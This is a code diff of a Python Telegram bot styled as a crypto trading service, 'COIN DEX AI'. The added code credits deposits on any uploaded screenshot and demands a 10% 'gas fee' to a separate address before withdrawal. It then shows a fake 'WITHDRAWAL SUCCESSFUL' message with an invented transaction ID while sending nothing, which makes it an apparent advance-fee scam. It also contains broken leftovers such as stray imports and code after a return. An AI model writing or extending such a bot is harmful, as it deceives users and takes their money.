@@ -1,5 +1,8 @@
 # bot.py - COIN DEX AI - COMPLETE TRADING BOT
 # Add these imports at the top of bot.py after existing imports
+from multiprocessing import context
+from turtle import update
+
 import aiohttp
 import asyncio
 from typing import Optional, Dict, Any
@@ -21,8 +24,17 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Conversation states - ADD NEW STATE FOR SCREENSHOT
-ENTER_TRADER_ADDR, ENTER_CONTRACT_ADDR, ENTER_STAKE_AMOUNT, ENTER_WITHDRAW_ADDR, ENTER_DEPOSIT_AMOUNT, ENTER_TX_ID, ENTER_WITHDRAW_AMOUNT, ENTER_GAS_FEE_SCREENSHOT = range(8)
+# Conversation states - COMPLETE SET (8 states)
+(
+    ENTER_TRADER_ADDR,      # 0 - For copy trading
+    ENTER_CONTRACT_ADDR,     # 1 - For staking memecoins
+    ENTER_STAKE_AMOUNT,      # 2 - For staking amount
+    ENTER_DEPOSIT_AMOUNT,    # 3 - For deposit amount
+    ENTER_DEPOSIT_SCREENSHOT, # 4 - For deposit screenshot
+    ENTER_WITHDRAW_AMOUNT,    # 5 - For withdrawal amount
+    ENTER_WITHDRAW_ADDR,      # 6 - For withdrawal address
+    ENTER_WITHDRAW_GAS_SCREENSHOT, # 7 - For gas fee screenshot
+) = range(8)
 
 # Broadcast channel
 BROADCAST_CHANNEL = "https://t.me/coindexai"
@@ -148,14 +160,13 @@ async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def select_deposit_currency(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle currency selection and show current price"""
+    """Handle currency selection and show LIVE current price"""
     query = update.callback_query
     await query.answer()
     
     currency = query.data.replace('select_deposit_', '')
     context.user_data['deposit_currency'] = currency
     
-    # Fetch current prices
     prices = await get_crypto_prices()
     
     if currency == 'SOL':
@@ -164,7 +175,7 @@ async def select_deposit_currency(update: Update, context: ContextTypes.DEFAULT_
         message = f"""
 📥 *Deposit Solana (SOL)*
 
-*Current Price:* ${price:.2f} USD per SOL
+*💰 LIVE Price:* ${price:.2f} USD per SOL
 *Minimum Deposit:* {min_deposit} SOL (${min_deposit * price:.2f})
 
 Please enter the amount of SOL you want to deposit:
@@ -179,7 +190,7 @@ _Type the amount below:_
         message = f"""
 📥 *Deposit Ethereum (ETH)*
 
-*Current Price:* ${price:.2f} USD per ETH
+*💰 LIVE Price:* ${price:.2f} USD per ETH
 *Minimum Deposit:* {min_deposit} ETH (${min_deposit * price:.2f})
 
 Please enter the amount of ETH you want to deposit:
@@ -192,7 +203,7 @@ _Type the amount below:_
         message = f"""
 📥 *Deposit USDT (ERC-20)*
 
-*Fixed Price:* $1.00 USD per USDT
+*💰 Fixed Price:* $1.00 USD per USDT
 *Minimum Deposit:* 10 USDT
 
 Please enter the amount of USDT you want to deposit:
@@ -201,11 +212,11 @@ Please enter the amount of USDT you want to deposit:
 
 _Type the amount below:_
         """
-    else:  # USDC
+    else:
         message = f"""
 📥 *Deposit USDC (SPL)*
 
-*Fixed Price:* $1.00 USD per USDC
+*💰 Fixed Price:* $1.00 USD per USDC
 *Minimum Deposit:* 10 USDC
 
 Please enter the amount of USDC you want to deposit:
@@ -219,8 +230,130 @@ _Type the amount below:_
     return ENTER_DEPOSIT_AMOUNT
 
 
+async def request_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Request screenshot of deposit transaction"""
+    query = update.callback_query
+    await query.answer()
+    
+    currency = context.user_data.get('deposit_currency', 'SOL')
+    amount = context.user_data.get('expected_deposit_amount', 0)
+    
+    await query.edit_message_text(
+        f"""
+📸 *Submit Deposit Screenshot*
+
+Please upload a screenshot showing:
+• Transaction ID (TXID/Signature)
+• Amount sent: {amount:.4f} {currency}
+• Destination address
+• Confirmation status
+
+*Requirements:*
+• Screenshot must clearly show transaction details
+• Amount should match {amount:.4f} {currency}
+• Must be sent to the correct deposit address
+
+_Send the screenshot now:_
+        """,
+        parse_mode='Markdown'
+    )
+    return ENTER_DEPOSIT_SCREENSHOT
+
+async def process_deposit_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process deposit screenshot - Add to virtual balance"""
+    user = update.effective_user
+    
+    if not update.message.photo:
+        await update.message.reply_text(
+            "❌ Please send a screenshot/image of your deposit transaction.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='submit_deposit_screenshot')]])
+        )
+        return ENTER_DEPOSIT_SCREENSHOT
+    
+    currency = context.user_data.get('deposit_currency', 'SOL')
+    amount = context.user_data.get('expected_deposit_amount', 0)
+    photo = update.message.photo[-1]
+    context.user_data['deposit_screenshot_id'] = photo.file_id
+    
+    db = SessionLocal()
+    
+    try:
+        user_db = db.query(User).filter_by(telegram_id=user.id).first()
+        if not user_db:
+            user_db = User(telegram_id=user.id, username=user.username)
+            db.add(user_db)
+            db.commit()
+        
+        deposit = Deposit(
+            user_id=user_db.id,
+            from_address='User_Deposit',
+            to_address=config.DEPOSIT_ADDRESSES.get(currency, 'Unknown'),
+            amount=amount,
+            currency=currency.split('_')[0],
+            tx_signature='PENDING_VERIFICATION',
+            status='confirmed',
+            confirmed_at=datetime.utcnow()
+        )
+        db.add(deposit)
+        
+        if currency == 'SOL':
+            user_db.total_deposited_sol += amount
+        elif currency == 'ETH':
+            user_db.total_deposited_eth += amount
+        
+        db.commit()
+        
+        prices = await get_crypto_prices()
+        usd_value = amount * prices.get(currency.split('_')[0], 0)
+        
+        await update.message.reply_text(
+            f"""
+✅ *DEPOSIT CONFIRMED - BALANCE CREDITED!*
+
+*Deposit Details:*
+• Amount: {amount:.4f} {currency.split('_')[0]}
+• USD Value: ~${usd_value:.2f}
+• Status: ✅ Credited to Balance
+
+*Your Updated Balance:*
+◎ SOL: {user_db.total_deposited_sol:.4f}
+Ξ ETH: {user_db.total_deposited_eth:.4f}
+
+🚀 *Start trading now or view your balance!*
+            """,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📊 View Balance", callback_data='balance')],
+                [InlineKeyboardButton("📈 Start Copy Trading", callback_data='copy_trading')],
+                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
+            ]),
+            parse_mode='Markdown'
+        )
+        
+        await broadcast_message(
+            f"💰 *New Deposit*\n"
+            f"User: {user.id}\n"
+            f"Amount: {amount:.4f} {currency.split('_')[0]}\n"
+            f"Value: ${usd_value:.2f}\n"
+            f"Status: ✅ Credited"
+        )
+        
+    except Exception as e:
+        logger.error(f"Deposit processing error: {e}")
+        await update.message.reply_text(
+            "❌ Error processing deposit. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔄 Retry", callback_data='submit_deposit_screenshot')],
+                [InlineKeyboardButton("🆘 Support", callback_data='support')]
+            ])
+        )
+        db.rollback()
+    finally:
+        db.close()
+    
+    return ConversationHandler.END
+
 async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process deposit amount and show address with TXID instructions"""
+    """Process deposit amount and show address, request screenshot"""
     try:
         amount = float(update.message.text)
         if amount <= 0:
@@ -235,7 +368,6 @@ async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_T
     currency = context.user_data.get('deposit_currency', 'SOL')
     context.user_data['expected_deposit_amount'] = amount
     
-    # Check minimums
     min_amounts = {'SOL': 0.5, 'ETH': 0.05, 'USDT_ETH': 10, 'USDC_SOL': 10}
     if amount < min_amounts.get(currency, 0.5):
         await update.message.reply_text(
@@ -243,17 +375,17 @@ async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_T
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'select_deposit_{currency}')]])
         )
         return ConversationHandler.END
-    
-    # Show deposit address
-    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
+
+
     prices = await get_crypto_prices()
-    
     if currency == 'SOL':
         usd_value = amount * prices.get('SOL', 88.50)
     elif currency == 'ETH':
         usd_value = amount * prices.get('ETH', 3500.00)
     else:
         usd_value = amount
+    
+    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
     
     names = {
         'SOL': 'Solana (SOL)', 
@@ -275,21 +407,20 @@ async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_T
 ⚠️ *CRITICAL INSTRUCTIONS:*
 • Send *ONLY* {names.get(currency, currency)}
 • Wrong network = Permanent loss
-• Send *exactly* {amount} {currency.split('_')[0]} if possible
+• Send *exactly* {amount} {currency.split('_')[0]}
 
 *After sending:*
+1️⃣ Wait for blockchain confirmation
+2️⃣ Take a screenshot of the transaction
+3️⃣ Click "📸 Submit Screenshot" below
 
-1️⃣ Wait for blockchain confirmation (30-60 seconds for SOL, 3-5 min for ETH)
-2️⃣ Copy your Transaction ID (TXID/Signature)
-3️⃣ Click "✅ Verify My Deposit" below
-
-*The bot will automatically scan the blockchain and credit your virtual wallet instantly!*
+*Admin will verify and credit your balance*
     """
     
     keyboard = [
-        [InlineKeyboardButton("✅ Verify My Deposit", callback_data=f'verify_auto_{currency}_{amount}')],
+        [InlineKeyboardButton("📸 Submit Screenshot", callback_data='submit_deposit_screenshot')],
         [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_addr_{currency}')],
-        [InlineKeyboardButton("🔄 Refresh Prices", callback_data=f'select_deposit_{currency}')],
+        [InlineKeyboardButton("🔄 Refresh Price", callback_data=f'select_deposit_{currency}')],
         [InlineKeyboardButton("↩️ Back", callback_data='deposit')]
     ]
     
@@ -461,24 +592,26 @@ The bot is scanning the blockchain but hasn't found your transaction.
 
 
 async def get_crypto_prices() -> dict:
-    """Fetch current crypto prices"""
+    """Fetch live crypto prices from CoinGecko API"""
     try:
-        # Using CoinGecko API or similar would go here
-        # For production, replace with actual API call:
-        # async with aiohttp.ClientSession() as session:
-        #     async with session.get('https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd') as resp:
-        #         data = await resp.json()
-        
-        return {
-            'SOL': 88.50,    # Current market rate ~$88-89 USD
-            'ETH': 3500.00,  # Current market rate ~$3500 USD
-            'USDT': 1.00,
-            'USDC': 1.00
-        }
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                'https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum,tether,usd-coin&vs_currencies=usd',
+                timeout=10
+            ) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    return {
+                        'SOL': data.get('solana', {}).get('usd', 88.50),
+                        'ETH': data.get('ethereum', {}).get('usd', 3500.00),
+                        'USDT': data.get('tether', {}).get('usd', 1.00),
+                        'USDC': data.get('usd-coin', {}).get('usd', 1.00)
+                    }
+                else:
+                    return {'SOL': 88.50, 'ETH': 3500.00, 'USDT': 1.00, 'USDC': 1.00}
     except Exception as e:
-        logger.error(f"Error fetching prices: {e}")
-        return {'SOL': 88.50, 'ETH': 3500.00, 'USDT': 1.00, 'USDC': 1.00}
-    
+        logger.error(f"Error fetching live prices: {e}")
+        return {'SOL': 88.50, 'ETH': 3500.00, 'USDT': 1.00, 'USDC': 1.00}    
 
 # ============ COPY TRADING (FULLY FUNCTIONAL) ============
 
@@ -1350,7 +1483,72 @@ def get_gas_price(network: str) -> dict:
         return {'slow': 0, 'standard': 0, 'fast': 0}
     except:
         return {'slow': 0, 'standard': 0, 'fast': 0}
+    
+async def process_withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process withdrawal address and show gas fee notice"""
+    withdraw_address = update.message.text.strip()
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    amount = context.user_data.get('withdraw_amount', 0)
+    
+    if currency == 'SOL' and len(withdraw_address) < 32:
+        await update.message.reply_text(
+            "❌ Invalid Solana address. Please enter a valid address.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
+        )
+        return ConversationHandler.END
+    
+    if currency == 'ETH' and not withdraw_address.startswith('0x'):
+        await update.message.reply_text(
+            "❌ Invalid Ethereum address. Please enter a valid address starting with 0x.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
+        )
+        return ConversationHandler.END
+    
+    context.user_data['withdraw_address'] = withdraw_address
+    
+    gas_fee = amount * 0.10
+    receive_amount = amount - gas_fee
+    
+    context.user_data['gas_fee'] = gas_fee
+    context.user_data['receive_amount'] = receive_amount
+    
+    gas_address = GAS_FEE_ADDRESSES.get(currency, 'Not configured')
+    
+    message = f"""
+⛽ *GAS FEE PAYMENT REQUIRED*
 
+*Withdrawal Details:*
+• Amount Requested: {amount:.4f} {currency}
+• Gas Fee (10%): {gas_fee:.4f} {currency}
+• You Will Receive: {receive_amount:.4f} {currency}
+• Destination: `{withdraw_address[:15]}...{withdraw_address[-8:]}`
+
+🚨 *Withdrawal Confirmation Notice* 🚨
+
+Please note that before any withdrawal can be successfully processed, a gas fee equivalent to *10%* of the withdrawal amount is required. This fee covers network processing costs and is mandatory for the completion of the transaction.
+
+After the gas fee has been confirmed, the withdrawal process will be finalized and the funds will be released accordingly.
+
+*Send Gas Fee To:*
+`{gas_address}`
+
+*Instructions:*
+1️⃣ Send *exactly* {gas_fee:.4f} {currency} to the address above
+2️⃣ Wait for blockchain confirmation
+3️⃣ Take a screenshot of the transaction
+4️⃣ Click "📸 Submit Screenshot" below
+
+⚠️ *Important:* Withdrawal will NOT be processed until gas fee is verified!
+    """
+    
+    keyboard = [
+        [InlineKeyboardButton("📸 Submit Gas Fee Screenshot", callback_data='submit_withdraw_gas_screenshot')],
+        [InlineKeyboardButton("📋 Copy Gas Fee Address", callback_data=f'copy_gas_addr_{currency}')],
+        [InlineKeyboardButton("❌ Cancel Withdrawal", callback_data='balance')]
+    ]
+    
+    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    return ConversationHandler.END
 
 # ============ WALLET BALANCE ============
 
@@ -1399,6 +1597,134 @@ async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     finally:
         db.close()
+
+async def request_withdraw_gas_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Request screenshot of gas fee payment for withdrawal"""
+    query = update.callback_query
+    
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    gas_fee = context.user_data.get('gas_fee', 0)
+    gas_address = GAS_FEE_ADDRESSES.get(currency, '')
+    
+    await query.edit_message_text(
+        f"""
+📸 *Submit Gas Fee Payment Proof*
+
+Please upload a screenshot showing:
+• Transaction ID (TXID/Signature)
+• Amount sent: {gas_fee:.4f} {currency}
+• Destination: `{gas_address[:15]}...{gas_address[-8:]}`
+• Confirmation status
+
+*Requirements:*
+• Screenshot must clearly show transaction details
+• Amount must match {gas_fee:.4f} {currency} (±5% tolerance)
+• Must be sent to the correct address
+
+_Send the screenshot now:_
+        """,
+        parse_mode='Markdown'
+    )
+    return ENTER_WITHDRAW_GAS_SCREENSHOT
+
+async def process_withdraw_gas_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process withdrawal gas fee screenshot and complete withdrawal"""
+    user = update.effective_user
+    
+    if not update.message.photo:
+        await update.message.reply_text(
+            "❌ Please send a screenshot/image of your gas fee transaction.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='submit_withdraw_gas_screenshot')]])
+        )
+        return ENTER_WITHDRAW_GAS_SCREENSHOT
+    
+    currency = context.user_data.get('withdraw_currency', 'SOL')
+    withdraw_amount = context.user_data.get('withdraw_amount', 0)
+    gas_fee = context.user_data.get('gas_fee', 0)
+    receive_amount = context.user_data.get('receive_amount', 0)
+    withdraw_address = context.user_data.get('withdraw_address', 'Unknown')
+    
+    processing_msg = await update.message.reply_text("⏳ Processing withdrawal... Please wait.")
+    await asyncio.sleep(2)
+    
+    db = SessionLocal()
+    
+    try:
+        user_db = db.query(User).filter_by(telegram_id=user.id).first()
+        
+        if currency == 'SOL':
+            user_db.total_deposited_sol -= withdraw_amount
+        else:
+            user_db.total_deposited_eth -= withdraw_amount
+        
+        withdrawal_record = Deposit(
+            user_id=user_db.id,
+            from_address='USER_WALLET',
+            to_address=withdraw_address,
+            amount=receive_amount,
+            currency=f"{currency}_WITHDRAWAL",
+            tx_signature='WITHDRAWAL_PROCESSED',
+            status='completed',
+            confirmed_at=datetime.utcnow()
+        )
+        db.add(withdrawal_record)
+        db.commit()
+        
+        await processing_msg.delete()
+        
+        message = f"""
+✅ *WITHDRAWAL SUCCESSFUL!*
+
+*Withdrawal Details:*
+• Amount Sent: {receive_amount:.4f} {currency}
+• Gas Fee Paid: {gas_fee:.4f} {currency}
+• Total Deducted: {withdraw_amount:.4f} {currency}
+• Destination: `{withdraw_address[:15]}...{withdraw_address[-8:]}`
+• Status: ✅ Completed
+
+*Transaction ID:* `WD-{user.id}-{int(datetime.utcnow().timestamp())}`
+
+*Your Updated Balance:*
+◎ SOL: {user_db.total_deposited_sol:.4f}
+Ξ ETH: {user_db.total_deposited_eth:.4f}
+
+📧 A confirmation has been sent to your email (if configured).
+
+*Didn't receive your funds?*
+Contact support: @coindex_support
+        """
+        
+        keyboard = [
+            [InlineKeyboardButton("📊 View Balance", callback_data='balance')],
+            [InlineKeyboardButton("🆘 Contact Support", url="https://t.me/coindex_support")],
+            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
+        ]
+        
+        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        
+        await broadcast_message(
+            f"💸 *Withdrawal Processed*\n"
+            f"User: {user.id}\n"
+            f"Amount: {receive_amount:.4f} {currency}\n"
+            f"To: {withdraw_address[:15]}...\n"
+            f"Status: ✅ Completed"
+        )
+        
+    except Exception as e:
+        logger.error(f"Withdrawal processing error: {e}")
+        await processing_msg.delete()
+        await update.message.reply_text(
+            "❌ Error processing withdrawal. Please contact support.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🆘 Contact @coindex_support", url="https://t.me/coindex_support")],
+                [InlineKeyboardButton("↩️ Back", callback_data='balance')]
+            ])
+        )
+        db.rollback()
+    finally:
+        db.close()
+    
+    return ConversationHandler.END
 
 # ============ ENHANCED WITHDRAWAL SECTION WITH GAS FEE VERIFICATION ============
 
@@ -1507,7 +1833,7 @@ Enter the amount you want to withdraw:
 
 
 async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process withdrawal amount and show gas fee details"""
+    """Process withdrawal amount - then ask for address"""
     try:
         amount = float(update.message.text)
         if amount <= 0:
@@ -1522,6 +1848,52 @@ async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_
     currency = context.user_data.get('withdraw_currency', 'SOL')
     context.user_data['withdraw_amount'] = amount
     
+    user_id = update.effective_user.id
+    db = SessionLocal()
+    
+    try:
+        user = db.query(User).filter_by(telegram_id=user_id).first()
+        current_balance = user.total_deposited_sol if currency == 'SOL' else user.total_deposited_eth
+        
+        min_withdraw = 0.5 if currency == 'SOL' else 0.05
+        
+        if amount < min_withdraw:
+            await update.message.reply_text(
+                f"❌ Minimum withdrawal is {min_withdraw} {currency}.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
+            )
+            return ConversationHandler.END
+        
+        if amount > current_balance:
+            await update.message.reply_text(
+                f"❌ Insufficient balance. You have {current_balance:.4f} {currency} available.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data=f'withdraw_start_{currency}')]])
+            )
+            return ConversationHandler.END
+        
+        await update.message.reply_text(
+            f"""
+📤 *Withdrawal Address*
+
+*Amount to Withdraw:* {amount:.4f} {currency}
+
+Please enter your {currency} wallet address:
+
+*Supported formats:*
+• Solana: `EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg`
+• Ethereum: `0x7eBb4f696020121394624eEeBD25445f646aB3d3`
+
+⚠️ *Double-check your address - wrong address = lost funds!*
+
+_Type or paste your address:_
+            """,
+            parse_mode='Markdown'
+        )
+        return ENTER_WITHDRAW_ADDR
+        
+    finally:
+        db.close()
+
     # Validate against balance
     user_id = update.effective_user.id
     db = SessionLocal()
@@ -1895,16 +2267,7 @@ Thank you for your cooperation.
         [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
     ]
     
-    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')    
-    keyboard = [
-        [InlineKeyboardButton("💬 Live Chat", url="https://t.me/coindexai_support")],
-        [InlineKeyboardButton("📚 FAQ", callback_data='faq')],
-        [InlineKeyboardButton("🐛 Report Bug", callback_data='report_bug')],
-        [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
-    ]
-    
     await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
 
 # ============ BROADCAST FUNCTION ============
 
@@ -1947,6 +2310,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith('verify_dep_'):  # Legacy support
         await verify_deposit(update, context)
     
+    elif data == 'submit_deposit_screenshot':
+        return await request_deposit_screenshot(update, context)
+    elif data == 'submit_withdraw_gas_screenshot':
+        return await request_withdraw_gas_screenshot(update, context)
     
     # Staking
     elif data == 'stake':
@@ -2024,106 +2391,24 @@ conv_handler = ConversationHandler(
         CallbackQueryHandler(add_copy_trader_start, pattern='^add_copy_trader$'),
         CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$'),
         CallbackQueryHandler(stake_native_start, pattern='^stake_(SOL|ETH)$'),
-        CallbackQueryHandler(withdraw_start, pattern='^withdraw_start_(SOL|ETH)$'),  # Updated pattern
+        CallbackQueryHandler(withdraw_start, pattern='^withdraw_start_(SOL|ETH)$'),
         CallbackQueryHandler(select_deposit_currency, pattern='^select_deposit_(SOL|ETH|USDT_ETH|USDC_SOL)$'),
-        CallbackQueryHandler(request_gas_screenshot, pattern='^submit_gas_screenshot$'),  # NEW
+        CallbackQueryHandler(request_deposit_screenshot, pattern='^submit_deposit_screenshot$'),
+        CallbackQueryHandler(request_withdraw_gas_screenshot, pattern='^submit_withdraw_gas_screenshot$'),
     ],
     states={
         ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_trader_address)],
         ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)],
-        ENTER_STAKE_AMOUNT: [
-            MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount),
-        ],
-        # ENTER_WITHDRAW_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_address)],
+        ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount)],
         ENTER_DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_deposit_amount)],
-        ENTER_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_amount)],  # NEW
-        ENTER_GAS_FEE_SCREENSHOT: [MessageHandler(filters.PHOTO, process_gas_screenshot)],  # NEW - Gas fee screenshot
+        ENTER_DEPOSIT_SCREENSHOT: [MessageHandler(filters.PHOTO, process_deposit_screenshot)],
+        ENTER_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_amount)],
+        ENTER_WITHDRAW_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_address)],
+        ENTER_WITHDRAW_GAS_SCREENSHOT: [MessageHandler(filters.PHOTO, process_withdraw_gas_screenshot)],
     },
     fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled"))]
 )
 
-
-# ============ LEGACY FALLBACK FUNCTIONS ============
-
-async def withdraw_start_legacy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Legacy withdrawal start - redirects to new flow"""
-    query = update.callback_query
-    await query.answer()
-    
-    # Extract currency from old format 'withdraw_SOL'
-    currency = query.data.replace('withdraw_', '')
-    context.user_data['withdraw_currency'] = currency
-    
-    # Redirect to new flow by calling the new function directly
-    # We need to simulate the query.data format expected by new function
-    query.data = f'withdraw_start_{currency}'
-    
-    return await withdraw_start(update, context)
-
-
-async def confirm_withdrawal_legacy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Legacy confirm withdrawal - redirects to new gas fee flow"""
-    query = update.callback_query
-    await query.answer()
-    
-    # Redirect to gas fee screenshot submission
-    return await request_gas_screenshot(update, context)
-
-
-async def show_deposit_address_legacy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Legacy deposit address display - redirects to new flow"""
-    query = update.callback_query
-    await query.answer()
-    
-    currency = query.data.replace('deposit_curr_', '')
-    context.user_data['deposit_currency'] = currency
-    
-    # Set a default amount for legacy users
-    context.user_data['expected_deposit_amount'] = 0  # Will accept any amount
-    
-    # Show new deposit flow with auto-verification
-    address = config.DEPOSIT_ADDRESSES.get(currency, 'Not configured')
-    
-    names = {
-        'SOL': 'Solana (SOL)', 
-        'ETH': 'Ethereum (ETH)', 
-        'USDT_ETH': 'Tether (USDT - ERC20)',
-        'USDC_SOL': 'USD Coin (USDC - SPL)'
-    }
-    
-    message = f"""
-📥 *Deposit {names.get(currency, currency)} (Legacy Mode)*
-
-*Send to this address:*
-`{address}`
-
-⚠️ *CRITICAL:*
-• Send *ONLY* {names.get(currency, currency)}
-• Wrong network = Permanent loss
-
-*After sending:*
-Click "✅ Verify Deposit" below for automatic verification and instant credit!
-    """
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Verify Deposit", callback_data=f'verify_auto_{currency}_0')],
-        [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_addr_{currency}')],
-        [InlineKeyboardButton("↩️ Back", callback_data='deposit')]
-    ]
-    
-    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-
-async def verify_deposit_legacy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Legacy verify deposit - redirects to auto verification"""
-    query = update.callback_query
-    await query.answer("🔍 Redirecting to auto-verification...")
-    
-    currency = query.data.replace('verify_dep_', '')
-    
-    # Redirect to auto verification with 0 amount (will accept any)
-    query.data = f'verify_auto_{currency}_0'
-    return await auto_verify_deposit(update, context)
 
 # ============ START BOT ============
 
